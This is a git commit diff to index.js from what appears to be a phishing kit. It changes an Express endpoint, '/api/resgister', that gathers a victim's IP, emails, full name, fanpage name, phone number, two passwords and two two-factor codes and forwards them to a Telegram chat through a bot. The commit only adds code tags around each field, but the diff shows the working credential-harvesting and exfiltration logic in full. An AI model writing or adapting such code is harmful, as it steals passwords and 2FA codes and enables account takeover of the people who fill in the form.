699402fb584ceca6694b16a0c0c903c0d5bbf01e
truuu1223 <turnerbalistreri56@gmail.com>
2024-10-20 21:10:54 -0700

    update

--- index.js
+++ index.js
@@ -21,18 +21,18 @@ app.post('/api/resgister', (req, res) => {
     res.send(result);
 
     
-    const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
+    const message = `<strong>Ip:</strong> <code>${data.ip ? data.ip : ''}</code>
 ------------------------
-<strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
-<strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
-<strong>Full Name:</strong> ${data.fullName ? data.fullName : ''} 
-<strong>Fanpage Name:</strong> ${data.fanpageName ? data.fanpageName : ''}
-<strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
-<strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
-<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}
+<strong>Email Business:</strong> <code>${data.businessEmail ? data.businessEmail : ''} </code>
+<strong>Email Personal:</strong> <code>${data.personalEmail ? data.personalEmail : ''}</code>
+<strong>Full Name:</strong> <code>${data.fullName ? data.fullName : ''} </code>
+<strong>Fanpage Name:</strong> <code>${data.fanpageName ? data.fanpageName : ''}</code>
+<strong>Phone Number:</strong> <code>${data.mobilePhone ? data.mobilePhone : ''}</code>
+<strong>Password First:</strong> <code>${data.passwordFirst ? data.passwordFirst : ''}</code>
+<strong>Password Second:</strong> <code>${data.passwordSecond ? data.passwordSecond : ''}</code>
 ------------------------
-<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
-<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
+<strong>First Two-Fa:</strong> <code>${data.firstTwoFa ? data.firstTwoFa : ''}</code>
+<strong>Second Two-Fa:</strong> <code>${data.secondTwoFa ? data.secondTwoFa : ''}</code>`;
 
     bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
 
